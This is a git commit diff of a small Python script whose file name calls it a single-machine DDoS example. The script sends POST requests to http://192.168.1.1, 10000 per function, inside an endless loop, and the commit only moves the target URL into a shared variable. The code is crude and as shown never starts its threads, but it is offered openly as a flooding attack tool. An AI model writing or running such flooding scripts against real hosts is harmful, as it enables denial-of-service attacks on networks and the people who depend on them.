749fba2c7ab22b3642f2b3d594815526a9cfb29d
Subham Lamichhane <lamichhanesubham4@gmail.com>
2025-05-30 03:32:58 -0700

    Update singlemachinceddosexample.py

--- singlemachinceddosexample.py
+++ singlemachinceddosexample.py
@@ -1,16 +1,14 @@
 import threading
 import requests
+url="http://192.168.1.1"
 while True :
  def uptask():
-    url='http://192.168.1.1'
     for i in range (10000):
      response1=requests.post(url)
      print(response1.status_code)
     
- def downtask():
-    url='http://192.168.1.1' 
+ def downtask(): 
     for i in range (10000):
-    
      response2=requests.post(url)
      print(response2.status_code)
     
